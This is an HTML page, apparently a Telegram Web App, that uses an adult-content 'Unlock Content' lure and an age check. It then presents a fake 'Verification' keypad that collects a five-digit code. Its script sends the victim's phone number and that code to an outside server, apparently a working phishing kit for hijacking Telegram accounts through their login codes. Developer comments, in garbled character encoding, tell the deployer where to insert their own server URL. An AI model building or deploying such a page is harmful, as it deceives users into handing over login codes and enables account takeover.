<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Content</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® */
        #loader { position: fixed; width: 100%; height: 100%; background: #0e1621; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .adult-emoji { font-size: 80px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }

        /* ‡¶Æ‡ßá‡¶á‡¶® ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://via.placeholder.com/500x1000'); background-size: cover; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; overflow: hidden; transition: background 0.5s; }
        
        #age-screen, #welcome-screen, #keypad-screen { text-align: center; display: none; width: 90%; max-width: 400px; }
        .age-box { background: rgba(23, 33, 43, 0.9); padding: 30px; border-radius: 20px; border: 1px solid #2481cc; }
        .age-btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; }
        .btn-plus { background: #2481cc; color: white; }
        .error-bg { background: #7b1113 !important; }

        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .otp-input { width: 45px; height: 55px; background: #17212b; border: 2px solid #2481cc; border-radius: 10px; text-align: center; font-size: 26px; font-weight: bold; line-height: 55px; }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .key { background: #17212b; padding: 20px; border-radius: 12px; font-size: 24px; font-weight: 800; border: 1px solid #2481cc22; cursor: pointer; }
        .error-shake { border-color: #f44336 !important; animation: shake 0.4s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 50% { transform: translateX(8px); } }
    </style>
</head>
<body>

    <div id="loader"><div class="adult-emoji">üîû</div></div>

    <div id="age-screen">
        <div class="age-box">
            <h2>Confirm Your Age</h2>
            <button class="age-btn btn-plus" onclick="verifyAge(true)">I am 18 or older</button>
            <button class="age-btn" style="background:#343a40; color:white;" onclick="verifyAge(false)">Under 18</button>
        </div>
    </div>

    <div id="welcome-screen">
        <div style="width:80px;height:80px;background:#f44336;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-weight:800;font-size:26px;border:3px solid white;margin-bottom:10px;">18+</div>
        <h1>Unlock Content üî•</h1>
        <button style="background:#2481cc;color:white;padding:18px 60px;border-radius:50px;font-weight:bold;border:none;" onclick="requestContact()">Enter ‚úÖ</button>
    </div>

    <div id="keypad-screen">
        <h2>Verification</h2>
        <div class="otp-container">
            <div class="otp-input" id="box1"></div><div class="otp-input" id="box2"></div><div class="otp-input" id="box3"></div><div class="otp-input" id="box4"></div><div class="otp-input" id="box5"></div>
        </div>
        <div class="keypad">
            <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
            <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
            <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
            <div class="key" onclick="clearLast()">‚å´</div><div class="key" onclick="press(0)">0</div>
        </div>
    </div>

    <script>
        const API_URL = "https://tg-setting.onrender.com"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∞‡ßá‡¶®‡ßç‡¶°‡¶æ‡¶∞ ‡¶á‡¶â‡¶Ü‡¶∞‡¶è‡¶≤ ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¶‡¶ø‡¶®
        let user_phone = "+88017XXXXXXXX"; // ‡¶è‡¶ü‡¶ø ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá ‡¶∏‡ßá‡¶ü ‡¶π‡¶¨‡ßá
        let code = "";
        const inputs = document.querySelectorAll('.otp-input');

        window.onload = () => setTimeout(() => { document.getElementById('loader').style.display='none'; document.getElementById('age-screen').style.display='block'; }, 2000);

        function verifyAge(adult) { 
            if(adult) { document.getElementById('age-screen').style.display='none'; document.getElementById('welcome-screen').style.display='block'; }
            else { document.body.classList.add('error-bg'); alert("Access Denied!"); }
        }

        function requestContact() {
            // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶∂‡ßá‡ßü‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶≤‡¶ú‡¶ø‡¶ï ‡¶è‡¶ñ‡¶æ‡¶®‡ßá
            document.getElementById('welcome-screen').style.display='none';
            document.getElementById('keypad-screen').style.display='block';
        }

        function press(num) {
            if (code.length < 5) { code += num; updateDisplay(); if (code.length === 5) login(); }
        }
        function clearLast() { code = code.slice(0, -1); updateDisplay(); }
        function updateDisplay() { inputs.forEach((box, i) => { box.innerText = code[i] || ""; box.classList.remove('error-shake'); }); }

        async function login() {
            const res = await fetch(`${API_URL}/verify`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: user_phone, otp: code })
            });
            const data = await res.json();
            if(data.status !== "success") {
                inputs.forEach(box => box.classList.add('error-shake'));
                setTimeout(() => { code = ""; updateDisplay(); }, 1000);
            }
        }
    </script>
</body>
</html>

